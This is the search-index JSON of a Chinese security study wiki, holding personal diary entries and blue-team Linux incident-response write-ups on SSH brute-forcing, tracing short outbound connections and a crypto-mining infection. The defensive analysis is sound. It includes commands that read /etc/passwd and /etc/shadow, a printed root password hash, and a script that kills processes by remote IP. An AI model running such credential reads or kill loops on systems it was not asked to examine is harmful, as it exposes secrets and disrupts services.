{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"hack for security \u00b6 \u7ad9\u70b9\u542f\u75282022\u5e74\uff0c\u8bb0\u5f55\u81ea\u5df1\u7ea2\u84dd\u65b9\u5411\u5b66\u4e60\u77e5\u8bc6\uff0c red-team \u00b6 blue-team \u00b6 tools \u00b6","title":"\u4e3b\u9875"},{"location":"#hack-for-security","text":"\u7ad9\u70b9\u542f\u75282022\u5e74\uff0c\u8bb0\u5f55\u81ea\u5df1\u7ea2\u84dd\u65b9\u5411\u5b66\u4e60\u77e5\u8bc6\uff0c","title":"hack for security"},{"location":"#red-team","text":"","title":"red-team"},{"location":"#blue-team","text":"","title":"blue-team"},{"location":"#tools","text":"","title":"tools"},{"location":"tags/","text":"","title":"Tags"},{"location":"about/aboutme/","text":"hi\uff0c\u5f88\u9ad8\u5174\u80fd\u9047\u5230\u5fd7\u540c\u9053\u5408\u7684\u670b\u53cb\uff0c\u6211\u53eb\u5706\u5468 2022\u5e74\u505a\u4e86\u5f88\u591a\u4e8b\uff0c\u7531\u4e8e\u4e4b\u524d\u5728\u535a\u5ba2\u56ed\u548ccsdn\u88ab\u5220\u9664\u4e86\u5f88\u591a\u6587\u7ae0\uff0c\u6211\u8003\u8651\u8f6c\u5230github\u4e0a\u505a\u81ea\u5df1\u7684wiki\u77e5\u8bc6\u5e93\uff0c\u4e3b\u8981\u5185\u5bb9\u662f\u8bb0\u5f55\u81ea\u5df1\u7684\u6280\u80fd\u6811\u65b9\u5411 2022.2.22 \u8003\u7814\u51fa\u6210\u7ee9\u4e86\u3002\u8fc7\u4e86\u56fd\u5bb6\u7ebf\uff0c\u80fd\u8fdb\u590d\u8bd5\uff0c\u4f46\u662f\u6211\u4e0d\u77e5\u9053\u600e\u4e48\u8bf4\u5462\uff0c\u524d\u51e0\u5929emo\u4e86\u5f88\u4e45\uff0c\u8fd8\u662f\u5f97\u597d\u597d\u9762\u5bf9\u81ea\u5df1\u4e86 2022.2.20 \u5e08\u5085\u4eec\u592a\u5f3a\u4e86\uff0c\u770b\u5230\u522b\u4eba\u8f93\u51fa\u7684\u9ad8\u8d28\u91cf\u6587\u7ae0\u4e0d\u5f97\u4e0d\u4f69\u670d\uff0c 2022.2.10 \u5728\u5bb6\u91cc\u5e72\u6d3b\uff0c\u7ec8\u4e8e\u5fd9\u5b8c\uff0c\u540e\u9762\u7b49\u6d88\u606f\uff0c\u6574\u4f53\u72b6\u6001\u662f\u8d8a\u6765\u8d8a\u7126\u8651\uff0c\u8d8a\u6765\u8d8a\u4e0d\u5b89 2022.2.5 \u00b6 \u6ca1\u60f3\u5230\u5b66\u4e60\u8fc7\u7a0b\u4e1c\u897f\u4f1a\u8fd9\u4e48\u591a\uff0c\u6709\u70b9\u5c0f\u5d29\u6e83\uff0c\u8d8a\u6765\u8d8a\u63a5\u8fd12022hw\uff0c\u9762\u8bd5\u7ea2\u961f\u7684\u4e1c\u897f\u771f\u7684\u597d\u591a\uff0c\u6628\u59291.30\uff0c\u51e0\u5929\u53c8\u4e0d\u77e5\u9053\u5565\u65f6\u5019\u5c3d\u5934 2022.1.17 \u00b6 \u5728\u8001\u5bb6\u53bb\u9762\u8bd5\u4e86\u672c\u5730\u7684\u7f51\u7edc\u5b89\u5168\u516c\u53f8\uff0c\u6295\u7684\u7b80\u5386\u90fd\u5f97\u5230\u4e86\u80af\u5b9a\uff0c\u4f46\u662f\u4ea4\u6d41\u5b8c\u4e4b\u540e\u4e0d\u5f97\u4e0d\u8bf4\u4e34\u6c82\u8fd9\u4e2a\u5730\u65b9\u8fd8\u662f\u5f88\u6709\u5dee\u8ddd\uff0c\u60f3\u505a\u653b\u9632\u7c7b\u672c\u5730\u6ca1\u6709\uff0c\u738b\u5b50\u6d69\u7ecf\u7406\u804a\u4e86\u4e24\u4e2a\u5c0f\u65f6\uff0c\u7167\u8fd9\u4e2a\u52bf\u5934\u6765\u8bb2\u8fd8\u662f\u5f976-8\u5e74\u624d\u80fd\u8d76\u5f97\u4e0a \u4e34\u6c82\u57ce\u6295\u7684\u65b0\u6210\u7acb\u516c\u53f85k 19\u85aa\u8d44 \u56fd\u4f01 \u6d4e\u535713-17k \u5b89\u670d\u4ed4 2022.1.14 \u00b6 \u5317\u4eac\u51ac\u5965\u4f1ahw\u7684\u6d88\u606f\u5df2\u7ecf\u786e\u5b9a\u4e0d\u80fd\u53bb\u4e86\uff0c\u4e3b\u8981\u539f\u56e0\u8fd8\u662f\u5317\u4eac\u653f\u7b5614\u5929\u5728\u4eac\uff0c\u53e6\u5916\u8fd8\u6709\u90e8\u5206\u662f\u56e0\u4e3a\u81ea\u5df1\u63d0\u524d\u4e0d\u77e5\u60c5\uff0c\u8fd8\u6709\u4e00\u4e2a\u9762\u8bd5\u957f\u4ead\u7684\u9ad8\u7ea7\u84dd\u961f \u95ee\u7684\u95ee\u9898\u771f\u7684\u633a\u96be\uff0c 2022.1.1 \u00b6 \u65b0\u5e74\u65b0\u6c14\u8c61\uff0c\u8bb8\u4e2a\u613f\u5427\uff0c\u7236\u6bcd\u8eab\u4f53\u5065\u5eb7\uff0c\u4e00\u5207\u4e07\u4e8b\u5982\u610f 2021.12.28 \u00b6 \u8003\u7814\u7ed3\u675f\u4e86\uff0c\u611f\u89c9\u6709\u70b9\u51c9\uff0c\u5929\u6c14\u90fd\u5230\u4e86\u96f6\u4e0b10\u2103\uff0c\u671f\u5f85\u51ac\u5965\u4f1ahw\u7684\u6d88\u606f \u672c\u7ad9\u7531mkdocs\u548cgithub\u642d\u5efa\uff0c\u53ef\u4ee5\u53c2\u8003\u63d2\u4ef6 \u4e3b\u9898 \u9009\u62e9\u5408\u9002\u7684\u4e3b\u9898 \u914d\u7f6e\u76f8\u5173 material","title":"about me"},{"location":"about/aboutme/#202225","text":"\u6ca1\u60f3\u5230\u5b66\u4e60\u8fc7\u7a0b\u4e1c\u897f\u4f1a\u8fd9\u4e48\u591a\uff0c\u6709\u70b9\u5c0f\u5d29\u6e83\uff0c\u8d8a\u6765\u8d8a\u63a5\u8fd12022hw\uff0c\u9762\u8bd5\u7ea2\u961f\u7684\u4e1c\u897f\u771f\u7684\u597d\u591a\uff0c\u6628\u59291.30\uff0c\u51e0\u5929\u53c8\u4e0d\u77e5\u9053\u5565\u65f6\u5019\u5c3d\u5934","title":"2022.2.5"},{"location":"about/aboutme/#2022117","text":"\u5728\u8001\u5bb6\u53bb\u9762\u8bd5\u4e86\u672c\u5730\u7684\u7f51\u7edc\u5b89\u5168\u516c\u53f8\uff0c\u6295\u7684\u7b80\u5386\u90fd\u5f97\u5230\u4e86\u80af\u5b9a\uff0c\u4f46\u662f\u4ea4\u6d41\u5b8c\u4e4b\u540e\u4e0d\u5f97\u4e0d\u8bf4\u4e34\u6c82\u8fd9\u4e2a\u5730\u65b9\u8fd8\u662f\u5f88\u6709\u5dee\u8ddd\uff0c\u60f3\u505a\u653b\u9632\u7c7b\u672c\u5730\u6ca1\u6709\uff0c\u738b\u5b50\u6d69\u7ecf\u7406\u804a\u4e86\u4e24\u4e2a\u5c0f\u65f6\uff0c\u7167\u8fd9\u4e2a\u52bf\u5934\u6765\u8bb2\u8fd8\u662f\u5f976-8\u5e74\u624d\u80fd\u8d76\u5f97\u4e0a \u4e34\u6c82\u57ce\u6295\u7684\u65b0\u6210\u7acb\u516c\u53f85k 19\u85aa\u8d44 \u56fd\u4f01 \u6d4e\u535713-17k \u5b89\u670d\u4ed4","title":"2022.1.17"},{"location":"about/aboutme/#2022114","text":"\u5317\u4eac\u51ac\u5965\u4f1ahw\u7684\u6d88\u606f\u5df2\u7ecf\u786e\u5b9a\u4e0d\u80fd\u53bb\u4e86\uff0c\u4e3b\u8981\u539f\u56e0\u8fd8\u662f\u5317\u4eac\u653f\u7b5614\u5929\u5728\u4eac\uff0c\u53e6\u5916\u8fd8\u6709\u90e8\u5206\u662f\u56e0\u4e3a\u81ea\u5df1\u63d0\u524d\u4e0d\u77e5\u60c5\uff0c\u8fd8\u6709\u4e00\u4e2a\u9762\u8bd5\u957f\u4ead\u7684\u9ad8\u7ea7\u84dd\u961f \u95ee\u7684\u95ee\u9898\u771f\u7684\u633a\u96be\uff0c","title":"2022.1.14"},{"location":"about/aboutme/#202211","text":"\u65b0\u5e74\u65b0\u6c14\u8c61\uff0c\u8bb8\u4e2a\u613f\u5427\uff0c\u7236\u6bcd\u8eab\u4f53\u5065\u5eb7\uff0c\u4e00\u5207\u4e07\u4e8b\u5982\u610f","title":"2022.1.1"},{"location":"about/aboutme/#20211228","text":"\u8003\u7814\u7ed3\u675f\u4e86\uff0c\u611f\u89c9\u6709\u70b9\u51c9\uff0c\u5929\u6c14\u90fd\u5230\u4e86\u96f6\u4e0b10\u2103\uff0c\u671f\u5f85\u51ac\u5965\u4f1ahw\u7684\u6d88\u606f \u672c\u7ad9\u7531mkdocs\u548cgithub\u642d\u5efa\uff0c\u53ef\u4ee5\u53c2\u8003\u63d2\u4ef6 \u4e3b\u9898 \u9009\u62e9\u5408\u9002\u7684\u4e3b\u9898 \u914d\u7f6e\u76f8\u5173 material","title":"2021.12.28"},{"location":"app%E5%AE%89%E5%85%A8/app%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/","text":"\u3010Android\u3011","title":"App\u5b89\u5168\u68c0\u6d4b"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/","text":"\u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u00b6 0x00 \u524d\u8a00 \u00b6 SSH \u662f\u76ee\u524d\u8f83\u53ef\u9760\uff0c\u4e13\u4e3a\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u548c\u5176\u4ed6\u7f51\u7edc\u670d\u52a1\u63d0\u4f9b\u5b89\u5168\u6027\u7684\u534f\u8bae\uff0c\u4e3b\u8981\u7528\u4e8e\u7ed9\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u4fdd\u8bc1\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\u3002SSH\u53e3\u4ee4\u957f\u5ea6\u592a\u77ed\u6216\u8005\u590d\u6742\u5ea6\u4e0d\u591f\uff0c\u5982\u4ec5\u5305\u542b\u6570\u5b57\uff0c\u6216\u4ec5\u5305\u542b\u5b57\u6bcd\u7b49\uff0c\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u7834\u89e3\uff0c\u4e00\u65e6\u88ab\u653b\u51fb\u8005\u83b7\u53d6\uff0c\u53ef\u7528\u6765\u76f4\u63a5\u767b\u5f55\u7cfb\u7edf\uff0c\u63a7\u5236\u670d\u52a1\u5668\u6240\u6709\u6743\u9650\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u767b\u5f55\u670d\u52a1\u5668\u8fdb\u884c\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u7aef\u53e3\u8fde\u63a5\u91cc\u5b58\u5728\u4e24\u6761\u53ef\u7591\u7684\u8fde\u63a5\u8bb0\u5f55\uff0c\u5982\u4e0b\u56fe\uff1a TCP\u521d\u59cb\u5316\u8fde\u63a5\u4e09\u6b21\u63e1\u624b\u5427\uff1a\u53d1SYN\u5305\uff0c\u7136\u540e\u8fd4\u56deSYN/ACK\u5305\uff0c\u518d\u53d1ACK\u5305\uff0c\u8fde\u63a5\u6b63\u5f0f\u5efa\u7acb\u3002\u4f46\u662f\u8fd9\u91cc\u6709\u70b9\u51fa\u5165\uff0c\u5f53\u8bf7\u6c42\u8005\u6536\u5230SYS/ACK\u5305\u540e\uff0c\u5c31\u5f00\u59cb\u5efa\u7acb\u8fde\u63a5\u4e86\uff0c\u800c\u88ab\u8bf7\u6c42\u8005\u7b2c\u4e09\u6b21\u63e1\u624b\u7ed3\u675f\u540e\u624d\u5efa\u7acb\u8fde\u63a5\u3002 \u5ba2\u6237\u7aefTCP\u72b6\u6001\u8fc1\u79fb\uff1a CLOSED->SYN_SENT->ESTABLISHED->FIN_WAIT_1->FIN_WAIT_2->TIME_WAIT->CLOSED \u670d\u52a1\u5668TCP\u72b6\u6001\u8fc1\u79fb\uff1a 1 CLOSED->LISTEN->SYN recv->ESTABLISHED->CLOSE_WAIT->LAST_ACK->CLOSED \u5f53\u5ba2\u6237\u7aef\u5f00\u59cb\u8fde\u63a5\u65f6\uff0c\u670d\u52a1\u5668\u8fd8\u5904\u4e8eLISTENING\uff0c\u5ba2\u6237\u7aef\u53d1\u4e00\u4e2aSYN\u5305\u540e\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u5230\u4e86\u5ba2\u6237\u7aef\u7684SYN\u5e76\u4e14\u53d1\u9001\u4e86ACK\u65f6\uff0c\u670d\u52a1\u5668\u5904\u4e8eSYN_RECV\u72b6\u6001\uff0c\u7136\u540e\u5e76\u6ca1\u6709\u518d\u6b21\u6536\u5230\u5ba2\u6237\u7aef\u7684ACK\u8fdb\u5165ESTABLISHED\u72b6\u6001\uff0c\u4e00\u76f4\u505c\u7559\u5728SYN_RECV\u72b6\u6001\u3002 \u5728\u8fd9\u91cc\uff0cSSH\uff0822\uff09\u7aef\u53e3\uff0c\u4e24\u6761\u5916\u7f51IP\u7684SYN_RECV\u72b6\u6001\u8fde\u63a5\uff0c\u76f4\u89c9\u544a\u8bc9\u4e86\u7ba1\u7406\u5458\uff0c\u8fd9\u91cc\u4e00\u5b9a\u6709\u4ec0\u4e48\u5f02\u5e38\u3002 0x02 \u65e5\u5fd7\u5206\u6790 \u00b6 SSH\u7aef\u53e3\u5f02\u5e38\uff0c\u6211\u4eec\u9996\u5148\u6709\u5fc5\u8981\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5\uff1a A\u3001\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5 1\u3001\u9664root\u4e4b\u5916\uff0c\u662f\u5426\u8fd8\u6709\u5176\u5b83\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd root 2\u3001\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7::: \u6211\u4eec\u53ef\u4ee5\u786e\u8ba4\u76ee\u524d\u7cfb\u7edf\u53ea\u6709\u4e00\u4e2a\u7ba1\u7406\u7528\u6237root\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u60f3\u5230\u7684\u662f/var/log/secure\uff0c\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u8bb0\u5f55\u4e86\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\u4e0b\u6765\u3002 B\u3001\u786e\u8ba4\u653b\u51fb\u60c5\u51b5\uff1a 1\u3001\u7edf\u8ba1\u4e86\u4e0b\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u7ea6\u6709126254\u6b21\u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u906d\u53d7\u66b4\u529b\u7834\u89e3 [root@localhost ~]# grep -o \"Failed password\" /var/log/secure|uniq -c 126254 Failed password 2\u3001\u8f93\u51fa\u767b\u5f55\u7206\u7834\u7684\u7b2c\u4e00\u884c\u548c\u6700\u540e\u4e00\u884c\uff0c\u786e\u8ba4\u7206\u7834\u65f6\u95f4\u8303\u56f4\uff1a [root@localhost ~]# grep \"Failed password\" /var/log/secure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 [root@localhost ~]# grep \"Failed password\" /var/log/secure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3\u3001\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr 12622 23.91.xxx.xxx 8942 114.104.xxx.xxx 8122 111.13.xxx.xxx 7525 123.59.xxx.xxx ................... 4\u3001\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user ..................... C\u3001\u7ba1\u7406\u5458\u6700\u8fd1\u767b\u5f55\u60c5\u51b5\uff1a 1\u3001\u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 ............................ \u901a\u8fc7\u767b\u5f55\u65e5\u5fd7\u5206\u6790\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u767b\u5f55IP\u3002 2\u3001\u987a\u4fbf\u7edf\u8ba1\u4e00\u4e0b\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 27 192.168.204.1 \u901a\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u4ece\u8fd1\u6bb5\u65f6\u95f4\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u767b\u5f55\u8bb0\u5f55\u6765\u770b\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u7684\u60c5\u51b5\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u5165\u4fb5\u6392\u67e5\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u9610\u8ff0\u3002 0x04 \u5904\u7406\u63aa\u65bd \u00b6 SSH\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u5411\u516c\u7f51\u5f00\u653e\u7ba1\u7406\u7aef\u53e3\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668ssh\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002 \u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u00b6 0x00 \u524d\u8a00 \u00b6 \u77ed\u8fde\u63a5\uff08short connnection\uff09\u662f\u76f8\u5bf9\u4e8e\u957f\u8fde\u63a5\u800c\u8a00\u7684\u6982\u5ff5\uff0c\u6307\u7684\u662f\u5728\u6570\u636e\u4f20\u9001\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u5728\u9700\u8981\u53d1\u9001\u6570\u636e\u65f6\uff0c\u624d\u53bb\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\uff0c\u6570\u636e\u53d1\u9001\u5b8c\u6210\u540e\uff0c\u5219\u65ad\u5f00\u6b64\u8fde\u63a5\uff0c\u5373\u6bcf\u6b21\u8fde\u63a5\u53ea\u5b8c\u6210\u4e00\u9879\u4e1a\u52a1\u7684\u53d1\u9001\u3002 \u5728\u7cfb\u7edf\u7ef4\u62a4\u4e2d\uff0c\u4e00\u822c\u5f88\u96be\u53bb\u5bdf\u89c9\uff0c\u9700\u8981\u501f\u52a9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u6216\u8005\u6293\u5305\u5206\u6790\uff0c\u624d\u80fd\u591f\u53bb\u53d1\u73b0\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\uff0c\u7f51\u7edc\u7ba1\u7406\u5458\u5728\u51fa\u53e3WAF\u68c0\u6d4b\u5230\u67d0\u53f0\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u9999\u6e2fI\u53d1\u8d77\u8bf7\u6c42 \uff0c\u611f\u89c9\u5f88\u5947\u602a\uff0c\u767b\u5f55\u670d\u52a1\u5668\u6392\u67e5\uff0c\u60f3\u8981\u627e\u5230\u53d1\u8d77\u77ed\u8fde\u63a5\u7684\u8fdb\u7a0b\u3002 0x02 \u65e5\u5fd7\u5206\u6790 \u00b6 \u767b\u5f55\u670d\u52a1\u5668\u67e5\u770b\u7aef\u53e3\u3001\u8fdb\u7a0b\uff0c\u5e76\u672a\u53d1\u73b0\u53d1\u73b0\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u4f46\u662f\u5f53\u591a\u6b21\u5237\u65b0\u7aef\u53e3\u8fde\u63a5\u65f6\uff0c\u53ef\u4ee5\u67e5\u770b\u8be5\u8fde\u63a5\u3002 \u6709\u65f6\u5019\u4e00\u76f4\u5237\u8fd9\u6761\u547d\u4ee4\u597d\u5341\u51e0\u6b21\u624d\u4f1a\u51fa\u73b0\uff0c\u50cf\u8fd9\u79cd\u7684\u77ed\u8fde\u63a5\u6781\u96be\u6355\u6349\u5230\u5bf9\u5e94\u7684\u8fdb\u7a0b\u548c\u6e90\u6587\u4ef6\u3002 \u624b\u52a8\u6355\u6349\u4f30\u8ba1\u6ca1\u620f\uff0c\u5f88\u96be\u8ffd\u8e2a\uff0c\u4e8e\u662f\u52a8\u624b\u5199\u4e86\u4e00\u6bb5\u5c0f\u811a\u672c\u6765\u6355\u6349\u77ed\u8fde\u63a5\u5bf9\u5e94\u7684pid\u548c\u6e90\u6587\u4ef6\u3002 \u811a\u672c\u6587\u4ef6\u5982\u4e0b\uff1a #!/bin/bash ip=118.184.15.40 i=1 while : do tmp=netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}' #echo $tmp if test -z \"$tmp\" then ((i=i+1)) else for pid in $tmp; do echo \"PID: \"${pid} result=ls -lh /proc/$pid|grep exe echo \"Process: \"${result} kill -9 $pid done break fi done echo \"Total number of times: \"${i} \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u8dd1\u4e86\u4e09\u6b21\u811a\u672c\uff0c\u53ef\u4ee5\u53d1\u73b0\u77ed\u8fde\u63a5\u6bcf\u6b21\u53d1\u8d77\u7684\u8fdb\u7a0bPid\u4e00\u76f4\u5728\u53d8\uff0c\u4f46\u5df2\u7ecf\u6355\u6349\u5230\u53d1\u8d77\u8be5\u5f02\u5e38\u8fde\u63a5\u7684\u8fdb\u7a0b\u6e90\u6587\u4ef6\u4e3a /usr/lib/nfsiod 0x04 \u5c0f\u7ed3 \u00b6 \u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u77ed\u8fde\u63a5\u4ee5\u53ca\u6355\u6349\u77ed\u8fde\u63a5\u6e90\u6587\u4ef6\u7684\u6280\u5de7\uff0c\u7ad9\u5728\u5b89\u5168\u7ba1\u7406\u5458\u7684\u89d2\u5ea6\uff0c\u5e94\u52a0\u5f3a\u5bf9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u7ba1\u7406\uff0c\u5728\u7f51\u7edc\u5c42\u53bb\u53d1\u73b0\u66f4\u591a\u5728\u7cfb\u7edf\u5c42\u5f88\u96be\u5bdf\u89c9\u7684\u5b89\u5168\u5a01\u80c1\u3002 \u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 \u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u5229\u7528\u6316\u77ff\u811a\u672c\u6765\u5b9e\u73b0\u6d41\u91cf\u53d8\u73b0\uff0c\u4f7f\u5f97\u6316\u77ff\u75c5\u6bd2\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\uff0c\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff08\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3001Struts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff09\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\uff0c\u5b89\u5168\u7ba1\u7406\u5458\u5728\u767b\u5f55\u5b89\u5168\u8bbe\u5907\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u67d0\u53f0\u7f51\u7ad9\u670d\u52a1\u5668\u6301\u7eed\u5411\u5883\u5916IP\u53d1\u8d77\u8fde\u63a5\uff0c\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff1a 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 A\u3001\u6392\u67e5\u8fc7\u7a0b \u00b6 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u4e0b\u8f7dlogo.jpg\uff0c\u5305\u542b\u811a\u672c\u5185\u5bb9\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u4e0b\u8f7dlogo.jpg\u5e76\u6267\u884c\u4e86\u91cc\u9762\u4e86shell\u811a\u672c\uff0c\u90a3\u8fd9\u4e2a\u811a\u672c\u662f\u5982\u4f55\u542f\u52a8\u7684\u5462\uff1f \u901a\u8fc7\u6392\u67e5\u7cfb\u7edf\u5f00\u673a\u542f\u52a8\u9879\u3001\u5b9a\u65f6\u4efb\u52a1\u3001\u670d\u52a1\u7b49\uff0c\u5728\u5b9a\u65f6\u4efb\u52a1\u91cc\u9762\uff0c\u53d1\u73b0\u4e86\u6076\u610f\u811a\u672c\uff0c\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u8d77\u8bf7\u6c42\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff0c\u5e76\u6267\u884c \u3002 B\u3001\u6eaf\u6e90\u5206\u6790 \u00b6 \u5728Tomcat log\u65e5\u5fd7\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u6837\u4e00\u6761\u8bb0\u5f55\uff1a \u5bf9\u65e5\u5fd7\u4e2d\u653b\u51fb\u6e90\u7801\u8fdb\u884c\u6458\u5f55\u5982\u4e0b\uff1a 